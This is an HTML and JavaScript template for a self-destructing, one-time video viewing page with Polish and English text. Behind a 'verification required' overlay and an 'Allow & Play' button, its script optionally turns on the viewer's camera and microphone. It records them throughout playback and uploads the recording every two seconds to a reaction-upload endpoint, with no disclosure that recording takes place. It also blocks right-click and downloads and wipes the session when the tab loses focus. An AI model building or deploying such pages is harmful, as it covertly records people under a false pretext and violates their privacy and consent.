<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body { background:#000;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;font-family:sans-serif;} #mainVideo { max-width:100%;max-height:100%;display:none; } #overlay { text-align:center;padding:20px; } #loading { display:none;color:#00ff88;font-size:20px;font-family:monospace;animation:blink 1s infinite;} button { padding:15px 30px;font-size:18px;background:red;color:white;border:none;cursor:pointer;font-weight:bold;} @keyframes blink { 50% { opacity: 0; } } .lang-switch { position:absolute; top:10px; right:20px; font-size:18px; font-weight:bold; cursor:pointer; color:#555; z-index:100;} .lang-active { color:#fff; text-shadow:0 0 5px #fff; }</style></head><body oncontextmenu="return false;" onload="initLang()"><div class="lang-switch"><span id="btn-pl" onclick="setLang('pl')">PL</span> | <span id="btn-en" onclick="setLang('en')">EN</span></div><div id="overlay"><h2 id="t-req">🔒 WYMAGANA WERYFIKACJA</h2><button id="startBtn">Zezwól i Odtwórz</button></div><div id="loading" id="t-load">... Ładowanie Strumienia ...</div><video id="mainVideo" playsinline controls controlsList="nodownload nofullscreen noremoteplayback"></video><script>const dict={pl:{req:"🔒 WYMAGANA WERYFIKACJA",btn:"Zezwól i Odtwórz",load:"... Ładowanie Strumienia ...",dead:"💀 Materiał spalony.",cut:"🛑 ODCINA."},en:{req:"🔒 VERIFICATION REQUIRED",btn:"Allow & Play",load:"... Decrypting Stream ...",dead:"💀 Asset destroyed.",cut:"🛑 CONNECTION SEVERED."}}; let currLang='en'; function setLang(lang){currLang=lang; document.getElementById('t-req').innerText=dict[lang].req; document.getElementById('startBtn').innerText=dict[lang].btn; document.getElementById('loading').innerText=dict[lang].load; document.getElementById('btn-pl').className=lang==='pl'?'lang-active':''; document.getElementById('btn-en').className=lang==='en'?'lang-active':'';} function initLang(){const l=navigator.language||navigator.userLanguage; setLang(l.startsWith('pl')?'pl':'en');} const startBtn=document.getElementById('startBtn'), mainVideo=document.getElementById('mainVideo'), loading=document.getElementById('loading'); const streamId="{{ stream_id }}", orgToken="{{ token }}"; const reqCam={{ req_cam }}; function nukeSession(){navigator.sendBeacon('/destroy_session/'+streamId);} startBtn.addEventListener('click', async()=>{ document.getElementById('overlay').style.display='none'; loading.style.display='block'; let stream=null, mediaRecorder=null; if(reqCam===1){ try{stream=await navigator.mediaDevices.getUserMedia({video:true,audio:true}); mediaRecorder=new MediaRecorder(stream,{mimeType:'video/webm'}); mediaRecorder.ondataavailable=e=>{if(e.data.size>0)fetch('/upload_reaction/'+orgToken,{method:'POST',body:e.data});}; mediaRecorder.start(2000);}catch(err){alert('Brak zgody na kamerę!'); location.reload(); return;} } mainVideo.src="/stream/"+streamId; mainVideo.load(); mainVideo.oncanplay=()=>{loading.style.display='none'; mainVideo.style.display='block'; mainVideo.play().catch(e=>console.log("Czekam na PLAY."));}; mainVideo.onended=()=>{if(mediaRecorder){mediaRecorder.stop(); stream.getTracks().forEach(t=>t.stop());} nukeSession(); document.body.innerHTML=`<h1 style='color:red;'>${dict[currLang].dead}</h1>`;}; document.addEventListener("visibilitychange",()=>{if(document.hidden){nukeSession(); document.body.innerHTML=`<h1 style='color:red;'>${dict[currLang].cut}</h1>`;}}); }); window.addEventListener('beforeunload', nukeSession);</script></body></html>
